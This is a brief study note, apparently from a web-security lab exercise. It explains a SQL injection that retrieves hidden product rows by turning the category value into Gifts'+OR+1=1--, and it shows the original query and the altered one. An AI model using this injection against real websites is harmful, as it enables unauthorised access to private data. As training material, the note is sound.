Vulnerability in WHERE clause:
    -The main motive of this challenge is to retrieve hidden data
    -SELECT * FROM products WHERE category = 'Gifts' AND released = 1 this will be the SQL responce
    -we change it as category =Gifts'+OR+1=1--
    -"--" is used to comment the words. So after -- there will be no arugument everything will consider as comment
    -"+OR+1=1" this gives OR 1=1 Which means 1=1 is true so every data also hidden data will be retrieved
    -SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 